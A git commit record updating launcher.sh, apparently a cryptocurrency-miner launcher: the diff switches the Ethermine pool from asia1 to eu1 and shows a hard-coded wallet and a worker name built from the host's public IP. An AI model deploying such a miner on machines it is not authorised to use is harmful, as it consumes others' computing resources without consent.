1d1029e227ec52215cf7ed94469595568c7de56d
Wahdan Labib N M <31770248+magelang9etar@users.noreply.github.com>
2021-02-11 09:54:57 +0700

    Update launcher.sh

--- launcher.sh
+++ launcher.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-POOL=asia1.ethermine.org:14444
+POOL=eu1.ethermine.org:14444
 WALLET=0xcf089150cedab8b714ea54333fbff85f7a97515e
 WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-lol
 
